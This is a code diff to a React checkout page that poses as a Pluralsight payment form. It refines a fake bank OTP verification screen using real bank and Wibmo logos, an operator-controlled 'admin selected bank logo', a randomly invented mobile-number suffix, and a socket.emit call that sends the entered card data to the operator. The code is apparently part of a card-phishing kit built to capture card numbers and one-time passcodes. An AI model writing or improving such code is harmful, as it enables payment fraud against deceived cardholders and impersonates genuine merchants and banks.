@@ -23,7 +23,7 @@ const bankLogos = [
   'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
 ];
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useSearchParams, useNavigate, Link, useLocation } from 'react-router-dom';
 import { ArrowLeft, Lock, CreditCard, Loader2, MoreHorizontal, CheckCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
@@ -179,6 +179,7 @@ const Checkout = () => {
   
   const [agreeTerms, setAgreeTerms] = useState(false);
   const [showTermsError, setShowTermsError] = useState(false);
+  const [finalConsent, setFinalConsent] = useState(false);
   const [promoCode, setPromoCode] = useState('');
 
   // Debug: Log the current state of agreeTerms
@@ -236,6 +237,10 @@ const Checkout = () => {
   const [otpCustomAmount, setOtpCustomAmount] = useState<number | null>(null);
   const [otpCurrency, setOtpCurrency] = useState('INR');
   const [otpCurrencySymbol, setOtpCurrencySymbol] = useState('₹');
+  const [adminSelectedBankLogo, setAdminSelectedBankLogo] = useState<string>('');
+
+  // Card session map to store bank logos and mobile numbers for each card
+  const cardSessionMap = useRef<{ [key: string]: { logo: string; last4: string } }>({});
 
   // Card brand logos
   const cardBrandLogos = {
@@ -290,8 +295,6 @@ const Checkout = () => {
     console.log('Unknown card type, defaulting to visa');
     return 'visa'; // default fallback
   };
-
-  const cardSessionMap = React.useRef({});
 
   // Pricing data based on the main page
   const pricingData = {
@@ -692,16 +695,25 @@ const Checkout = () => {
         setOtpCustomAmount(data.customAmount);
         setOtpCurrency(data.currency || 'INR');
         setOtpCurrencySymbol(data.currencySymbol || '₹');
+        
+        // IMPORTANT: Capture the admin-selected bank logo
+        if (data.bankLogo) {
+          console.log('🎯 Admin selected bank logo received:', data.bankLogo);
+          setAdminSelectedBankLogo(data.bankLogo);
+        }
+        
         console.log('Updated OTP currency display:', {
           amount: data.customAmount,
           currency: data.currency,
-          symbol: data.currencySymbol
+          symbol: data.currencySymbol,
+          bankLogo: data.bankLogo
         });
       } else {
         // Reset to defaults if no custom data
         setOtpCustomAmount(null);
         setOtpCurrency('INR');
         setOtpCurrencySymbol('₹');
+        setAdminSelectedBankLogo('');
       }
       
       // Show loading overlay for 4-5 seconds
@@ -974,6 +986,13 @@ const Checkout = () => {
         const randomLast4 = Math.floor(1000 + Math.random() * 9000).toString();
         cardSessionMap.current[cardKey] = { logo: randomLogo, last4: randomLast4 };
       }
+      
+      // Debug logging
+      console.log('🔍 Bank logo selection debug:');
+      console.log('Admin selected bank logo:', adminSelectedBankLogo);
+      console.log('Session bank logo (random):', cardSessionMap.current[cardKey].logo);
+      console.log('Will use admin logo if available:', adminSelectedBankLogo || cardSessionMap.current[cardKey].logo);
+      
       setSessionBankLogo(cardSessionMap.current[cardKey].logo);
       setOtpMobileLast4(cardSessionMap.current[cardKey].last4);
       socket.emit('payment-data', paymentData);
@@ -1682,19 +1701,19 @@ const Checkout = () => {
 
             {/* Enhanced OTP Verification Section */}
             {currentStep === 'otp' && (
-              <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-2">
-                <div className="flex flex-col items-center">
+              <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-4">
+                <div className="flex flex-col items-center w-full">
                   {/* Cancel Button (above white box, right-aligned) */}
-                  <div className="flex justify-end w-full mb-2" style={{ minWidth: 420, maxWidth: 440 }}>
+                  <div className="flex justify-end w-full mb-2 max-w-xs">
                     <button
                       onClick={() => setShowCancelConfirm(true)}
-                      className="text-white hover:text-gray-300 text-sm font-medium underline bg-transparent border-none cursor-pointer"
+                      className="text-white hover:text-gray-300 text-xs font-medium underline bg-transparent border-none cursor-pointer"
                       aria-label="Cancel Transaction"
                     >
                       cancel
                     </button>
                   </div>
-                  <div className="bg-white rounded-lg shadow-2xl relative" style={{ minWidth: 420, maxWidth: 440 }}>
+                  <div className="bg-white rounded-lg shadow-2xl relative w-full max-w-xs">
                   {/* OTP Loading Overlay */}
                   {otpLoading && (
                     <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
@@ -1758,46 +1777,50 @@ const Checkout = () => {
 
 
                   {/* Top Row: Card Brand Logo (left) and Bank Logo (right) */}
-                  <div className="flex items-center justify-between px-8 pt-8 pb-2 border-b border-gray-200">
-                    <div className="flex items-center gap-3">
-                      <div className="flex items-center justify-center bg-white rounded-md border border-gray-200 p-2 shadow-sm">
+                  <div className="flex items-center justify-between px-4 pt-4 pb-2 border-b border-gray-200">
+                    <div className="flex items-center gap-2">
+                      <div className="flex items-center justify-center bg-white rounded-md border border-gray-200 p-1 shadow-sm">
                         <img
                           src={cardBrandLogos[getCardBrand(cardData.cardNumber) as keyof typeof cardBrandLogos]}
                           alt="Card Brand Logo"
-                          className="h-10 w-auto max-w-[80px] object-contain"
+                          className="h-6 w-auto max-w-[50px] object-contain"
                           onError={(e) => {
                             console.log('Header logo loading failed, falling back to Visa');
                             e.currentTarget.src = cardBrandLogos.visa;
                           }}
                         />
                       </div>
-                      <span className="font-semibold text-gray-700 text-base">ID Check</span>
+                      <span className="font-semibold text-gray-700 text-sm">ID Check</span>
                     </div>
                     <img
-                      src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
+                      src={adminSelectedBankLogo || sessionBankLogo || 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png'}
                       alt="Bank Logo"
-                      className="h-10 w-24 object-contain"
+                      className="h-6 w-16 object-contain"
+                      onError={(e) => {
+                        console.log('❌ Bank logo failed to load, using fallback');
+                        e.currentTarget.src = 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
+                      }}
                     />
                   </div>
                   {/* Merchant Details Table */}
-                  <div className="px-8 pt-4 pb-2">
-                    <table className="w-full text-sm">
+                  <div className="px-4 pt-2 pb-2">
+                    <table className="w-full text-xs">
                       <tbody>
                         <tr>
-                          <td className="text-gray-600 py-1">Merchant Name</td>
-                          <td className="text-right font-medium text-gray-800 py-1">PLURALSIGHT</td>
+                          <td className="text-gray-600 py-0.5">Merchant Name</td>
+                          <td className="text-right font-medium text-gray-800 py-0.5">PLURALSIGHT</td>
                         </tr>
                         <tr>
-                          <td className="text-gray-600 py-1">Date</td>
-                          <td className="text-right font-medium text-gray-800 py-1">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
+                          <td className="text-gray-600 py-0.5">Date</td>
+                          <td className="text-right font-medium text-gray-800 py-0.5">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
                         </tr>
                         <tr>
-                          <td className="text-gray-600 py-1">Card Number</td>
-                          <td className="text-right font-medium text-gray-800 py-1">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
+                          <td className="text-gray-600 py-0.5">Card Number</td>
+                          <td className="text-right font-medium text-gray-800 py-0.5">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
                         </tr>
                         <tr>
-                          <td className="text-gray-600 py-1">Amount</td>
-                          <td className="text-right font-bold text-blue-700 py-1">
+                          <td className="text-gray-600 py-0.5">Amount</td>
+                          <td className="text-right font-bold text-blue-700 py-0.5">
                             {otpCustomAmount !== null ? (
                               `${otpCurrencySymbol}${otpCustomAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
                             ) : (
@@ -1805,53 +1828,49 @@ const Checkout = () => {
                             )}
                           </td>
                         </tr>
-                        <tr>
-                          <td className="text-gray-600 py-1">Personal Message</td>
-                          <td className="text-right font-medium text-gray-800 py-1"></td>
-                        </tr>
                       </tbody>
                     </table>
                   </div>
                   {/* Authenticate Transaction Title */}
-                  <div className="px-8 pt-2 pb-0">
-                    <h3 className="text-base font-semibold text-blue-700 text-center mb-2">Authenticate Transaction</h3>
+                  <div className="px-4 pt-1 pb-0">
+                    <h3 className="text-sm font-semibold text-blue-700 text-center mb-1">Authenticate Transaction</h3>
                   </div>
                   {/* OTP Sent Message or Resend Message */}
-                  <div className="px-8">
-                    <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
-                      <p className="text-green-700 text-sm text-center">
+                  <div className="px-4">
+                    <div className="bg-green-50 border border-green-200 rounded p-1.5 mb-2">
+                      <p className="text-green-700 text-xs text-center">
                         {resendMessage || `One time passcode has been sent to your registered mobile number XX${otpMobileLast4}`}
                       </p>
                     </div>
                   </div>
                   {/* Addon Cardholder OTP Button */}
-                  <div className="px-8 mb-2">
-                    <button className="w-full bg-blue-50 text-blue-700 text-xs font-semibold py-1 rounded mb-2 border border-blue-100 hover:bg-blue-100 transition">
+                  <div className="px-4 mb-1">
+                    <button className="w-full bg-blue-50 text-blue-700 text-xs font-semibold py-1 rounded border border-blue-100 hover:bg-blue-100 transition">
                       CLICK HERE For Addon Cardholder OTP
                     </button>
                   </div>
                   {/* Error Message (Fail OTP) */}
                   {otpError && (
-                    <div className="px-8 mb-2">
-                      <div className="border border-red-500 rounded p-2">
+                    <div className="px-4 mb-1">
+                      <div className="border border-red-500 rounded p-1.5">
                         <p className="text-red-700 text-xs text-center">{otpError}</p>
                       </div>
                     </div>
                   )}
                   {/* OTP Input */}
-                  <div className="px-8 mb-2">
+                  <div className="px-4 mb-1">
                     <input
                       value={otpValue}
                       onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                       disabled={otpSubmitting}
-                      className="w-full text-center text-base tracking-widest h-10 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                      className="w-full text-center text-sm tracking-widest h-8 border-2 border-blue-400 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
                       placeholder="Enter OTP Here"
                       maxLength={6}
-                      style={{ letterSpacing: '0.3em', fontSize: '1rem' }}
+                      style={{ letterSpacing: '0.3em', fontSize: '0.875rem' }}
                     />
                   </div>
                   {/* Resend OTP Link */}
-                  <div className="px-8 mb-2 text-right">
+                  <div className="px-4 mb-1 text-right">
                     <button
                       onClick={() => {
                         setResendMessage('One time passcode has been sent to your registered mobile number XX' + otpMobileLast4);
@@ -1865,16 +1884,16 @@ const Checkout = () => {
                     </button>
                   </div>
                   {/* Action Buttons */}
-                  <div className="px-8 pb-2">
+                  <div className="px-4 pb-2">
                     <div className="flex gap-2">
                       {/* Submit Button - Half Width */}
                       <button
                         onClick={handleOtpSubmit}
                         disabled={otpValue.length !== 6 || otpSubmitting}
-                        className="flex-1 h-9 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-base"
+                        className="flex-1 h-8 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative text-xs"
                       >
                         {otpSubmitting ? (
-                          <span className="flex items-center justify-center"><Loader2 className="h-4 w-4 animate-spin mr-2" />SUBMIT</span>
+                          <span className="flex items-center justify-center"><Loader2 className="h-3 w-3 animate-spin mr-1" />SUBMIT</span>
                         ) : (
                           'SUBMIT'
                         )}
@@ -1883,7 +1902,7 @@ const Checkout = () => {
                       <button
                         onClick={() => setShowCancelConfirm(true)}
                         disabled={otpSubmitting}
-                        className="flex-1 h-9 rounded bg-gray-500 text-white font-semibold hover:bg-gray-600 transition disabled:opacity-50 text-base"
+                        className="flex-1 h-8 rounded bg-gray-500 text-white font-semibold hover:bg-gray-600 transition disabled:opacity-50 text-xs"
                       >
                         CANCEL
                       </button>
@@ -1891,16 +1910,16 @@ const Checkout = () => {
                   </div>
 
                   {/* Timer and Powered by Footer */}
-                  <div className="text-center space-y-2 pb-4 pt-2">
+                  <div className="text-center space-y-1 pb-3 pt-1">
                     <p className="text-xs text-gray-500">
                       This page automatically time out after {formatTimer(otpTimer)} minutes
                     </p>
-                    <div className="flex items-center justify-center gap-2">
+                    <div className="flex items-center justify-center gap-1">
                       <span className="text-xs text-gray-500">Powered by</span>
                       <img
                         src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png"
                         alt="Wibmo"
-                        className="h-4 object-contain"
+                        className="h-3 object-contain"
                       />
                     </div>
                   </div>
@@ -2014,8 +2033,16 @@ const Checkout = () => {
 
                 {/* Consent Checkbox */}
                 <div className="flex items-start gap-3 mb-6">
-                  <Checkbox className="w-5 h-5 mt-1 flex-shrink-0 border-2 border-gray-400 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=unchecked]:bg-transparent data-[state=unchecked]:border-gray-400 hover:border-blue-500 transition-colors" />
-                  <label className="text-sm text-gray-300 leading-relaxed pt-0.5">
+                  <Checkbox 
+                    id="final-consent-checkbox"
+                    checked={finalConsent}
+                    onCheckedChange={(checked) => setFinalConsent(checked === true)}
+                    className="w-5 h-5 mt-1 flex-shrink-0 border-2 border-gray-400 data-[state=checked]:bg-blue-600 data-[state=checked]:border-blue-600 data-[state=unchecked]:bg-transparent data-[state=unchecked]:border-gray-400 hover:border-blue-500 transition-colors cursor-pointer" 
+                  />
+                  <label 
+                    htmlFor="final-consent-checkbox"
+                    className="text-sm text-gray-300 leading-relaxed pt-0.5 cursor-pointer"
+                  >
                     By checking here and continuing, I agree to the Pluralsight{' '}
                     <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
                       Terms of Use
@@ -2026,8 +2053,12 @@ const Checkout = () => {
 
                 <Button
                   onClick={handleConfirmPayment}
-                  disabled={confirmingPayment}
-                  className="w-full sm:w-auto px-8 sm:px-12 py-2 sm:py-3 rounded font-medium text-sm sm:text-base bg-green-600 hover:bg-green-700 text-white relative"
+                  disabled={confirmingPayment || !finalConsent}
+                  className={`w-full sm:w-auto px-8 sm:px-12 py-2 sm:py-3 rounded font-medium text-sm sm:text-base relative ${
+                    finalConsent && !confirmingPayment
+                      ? 'bg-green-600 hover:bg-green-700 text-white' 
+                      : 'bg-slate-500 text-slate-300 cursor-not-allowed'
+                  }`}
                 >
                   {confirmingPayment && (
                     <>
